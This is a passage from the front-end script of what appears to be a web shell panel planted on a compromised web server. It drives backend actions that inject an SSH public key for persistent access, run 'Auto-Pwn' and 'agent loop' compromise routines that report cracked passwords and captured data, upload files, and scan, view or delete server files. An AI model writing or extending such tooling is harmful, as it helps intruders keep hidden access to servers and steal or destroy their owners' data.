    btn.disabled = true; status.innerHTML = '<span class="loader"></span> scanning…'; res.innerHTML = '';
    try {
        const d = await api('content_scan'); btn.disabled = false;
        if (!d.ok) { status.innerText = 'Error'; return; }
        status.innerText = `${d.data.length} files.`;
        if (!d.data.length) { res.innerHTML = '<p class="badge b-grn">Clean</p>'; return; }
        let html = '<table><tr><th>Tags</th><th>Title</th><th>Path</th><th>Actions</th></tr>';
        d.data.forEach(f => {
            const tags = f.hits.map(h => `<span class="badge b-red">${esc(h)}</span>`).join('');
            const rel = f.path.startsWith(ROOT) ? f.path.slice(ROOT.length) : f.path;
            html += `<tr><td>${tags}</td><td style="color:var(--yellow); font-weight:bold;">${esc(f.title)}</td><td style="font-family:monospace;">${esc(rel)}</td><td><button class="btn btn-sm" onclick="viewFile('${esc(f.path)}')">View</button><button class="btn btn-sm btn-red" onclick="deleteFile('${esc(f.path)}')">Delete</button></td></tr>`;
        });
        res.innerHTML = html + '</table>';
    } catch (e) { btn.disabled = false; status.innerText = 'Error: ' + e.message; }
}
async function injectSsh(){
    const key = document.getElementById('sshPubKey').value;
    const res = document.getElementById('sshResult');
    if (!/^(ssh-|ecdsa-|sk-)/.test(key)) { res.innerText = 'format salah'; return; }
    res.innerText = 'injecting…';
    try { const d = await api('inject_ssh', { pubkey: key }); res.innerHTML = d.ok ? `<span class="badge b-grn">SUCCESS</span> ${esc(d.msg)}` : `<span class="badge b-red">FAIL</span> ${esc(d.err)}`; }
    catch (e) { res.innerText = 'Error: ' + e.message; }
}
async function runAutoPwn(){
    if (!confirm('Auto-Pwn?')) return;
    const res = document.getElementById('pwnResult'); res.innerText = '[*] starting…';
    try {
        const d = await api('auto_pwn');
        if (d.log) res.innerHTML = d.log.map(l => `<div style="color:${l.includes('[!]')?'var(--green)':(l.includes('[-]')?'var(--red)':'var(--text)')}">${esc(l)}</div>`).join('');
        if (d.ok) res.innerHTML += `<div style="margin-top:10px;padding:10px;background:#064e3b;border:1px solid var(--green);color:#6ee7b7;"><b>SUCCESS</b> ${esc(d.method)}${d.pass?`<br>pass: ${esc(d.pass)}`:''}${d.data?`<br><pre>${esc(d.data).slice(0,500)}...</pre>`:''}</div>`;
        else res.innerHTML += `<div style="margin-top:10px;color:var(--red);"><b>FAILED</b></div>`;
    } catch (e) { res.innerText = 'Error: ' + e.message; }
}
async function runAgent(){
    if (!confirm('Agent loop?')) return;
    const res = document.getElementById('pwnResult'); res.innerText = '[*] thinking…';
    try {
        const d = await api('agent_loop');
        let html = (d.log||[]).map(l => `<div style="color:${l.includes('[!]')?'var(--green)':(l.includes('[-]')?'var(--red)':'var(--text)')}">${esc(l)}</div>`).join('');
        if (d.ok) html += `<div style="margin-top:10px;padding:10px;background:#064e3b;border:1px solid var(--green);color:#6ee7b7;"><b>AGENT SUCCESS</b> ${esc(d.method)}<br><pre>${esc(d.out).slice(0,500)}</pre></div>`;
        else html += `<div style="margin-top:10px;color:var(--red);"><b>AGENT FAILED</b></div>`;
        res.innerHTML = html;
    } catch (e) { res.innerText = 'Error: ' + e.message; }
}
async function uploadFile(e){
    e.preventDefault();
    const form = document.getElementById('uploadForm');
    const fd = new FormData(form);
    fd.append('csrf', CSRF); fd.append('act', 'upload');
    const res = document.getElementById('uploadResult'); res.innerText = 'uploading…';
    try {
        const r = await fetch(window.location.pathname, { method:'POST', body: fd, credentials:'same-origin' });
        const txt = await r.text();
        const json = await parseResp(txt);
        res.innerHTML = json.ok ? `<span class="badge b-grn">OK</span> ${esc(json.msg)}` : `<span class="badge b-red">FAIL</span> ${esc(json.err||json.msg)}`;
    } catch (e) { res.innerHTML = `<span class="badge b-red">FAIL</span> ${esc(e.message)}`; }
}

/* health check on load */
(async () => {
    try { await api('ping', {}); }
    catch (e) {
        const s = document.getElementById('status-line');
        s.innerHTML = '<span style="color:var(--red);">transport warning: ' + esc(e.message) + '</span>';
    }
})();
</script>
</body>
</html>
